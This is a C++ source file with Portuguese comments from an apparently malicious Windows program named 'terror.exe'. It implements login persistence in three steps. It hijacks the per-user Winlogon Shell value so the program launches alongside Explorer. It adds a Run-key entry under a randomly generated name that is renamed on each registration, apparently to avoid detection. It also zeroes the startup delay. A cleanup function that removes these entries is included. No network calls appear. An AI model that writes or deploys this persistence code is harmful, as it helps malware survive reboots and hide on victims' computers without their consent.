#include "persistence.h"
#include "registry.h"
#include "helper.h"
#include "globals.h"

void RegisterPersistence(const wchar_t* exePath) {
    // ── MÉTODO 1: Shell key ────────────────────────────────────────────────────
    // Winlogon lança terror.exe NO MESMO INSTANTE que o Explorer ao fazer login
    {
        wchar_t shellVal[MAX_PATH + 64];
        swprintf_s(shellVal, L"explorer.exe,\"%s\" /bat", exePath);
        HKEY ksh;
        if (!RegCreateKeyExW(HKEY_CURRENT_USER,
                L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
                0, nullptr, 0, KEY_SET_VALUE, nullptr, &ksh, nullptr)) {
            RegSetValueExW(ksh, L"Shell", 0, REG_SZ, (BYTE*)shellVal,
                (DWORD)((wcslen(shellVal) + 1) * sizeof(wchar_t)));
            RegCloseKey(ksh);
        }
    }
    // ── MÉTODO 2: HKCU\Run (backup) ───────────────────────────────────────────
    {
        wchar_t oldName[64] = {};
        if (LoadWstr(STATE_KEY, L"RunName", oldName, sizeof(oldName)) && oldName[0]) {
            HKEY k;
            if (!RegOpenKeyExW(HKEY_CURRENT_USER, RUN_KEY, 0, KEY_SET_VALUE, &k)) {
                RegDeleteValueW(k, oldName); RegCloseKey(k);
            }
        }
        wchar_t randName[32]; MakeRandomName(randName, 32);
        wchar_t cmd[MAX_PATH + 16]; swprintf_s(cmd, L"\"%s\" /bat", exePath);
        HKEY k;
        if (!RegOpenKeyExW(HKEY_CURRENT_USER, RUN_KEY, 0, KEY_SET_VALUE, &k)) {
            RegSetValueExW(k, randName, 0, REG_SZ, (BYTE*)cmd,
                (DWORD)((wcslen(cmd) + 1) * sizeof(wchar_t)));
            RegCloseKey(k);
        }
        SaveWstr(STATE_KEY, L"RunName", randName);
    }
    // ── Zera delay do HKCU\Run ────────────────────────────────────────────────
    {
        HKEY ks;
        if (!RegCreateKeyExW(HKEY_CURRENT_USER,
                L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Serialize",
                0, nullptr, 0, KEY_SET_VALUE, nullptr, &ks, nullptr)) {
            DWORD zero = 0;
            RegSetValueExW(ks, L"StartupDelayInMSec", 0, REG_DWORD,
                           (BYTE*)&zero, sizeof(zero));
            RegCloseKey(ks);
        }
    }
}

void UnregisterPersistence() {
    // Remove Shell key
    {
        HKEY ksh;
        if (!RegOpenKeyExW(HKEY_CURRENT_USER,
                L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
                0, KEY_SET_VALUE, &ksh)) {
            RegDeleteValueW(ksh, L"Shell"); RegCloseKey(ksh);
        }
    }
    // Remove HKCU\Run
    {
        wchar_t name[64] = {};
        if (LoadWstr(STATE_KEY, L"RunName", name, sizeof(name)) && name[0]) {
            HKEY k;
            if (!RegOpenKeyExW(HKEY_CURRENT_USER, RUN_KEY, 0, KEY_SET_VALUE, &k)) {
                RegDeleteValueW(k, name); RegCloseKey(k);
            }
        }
        SaveWstr(STATE_KEY, L"RunName", L"");
    }
}
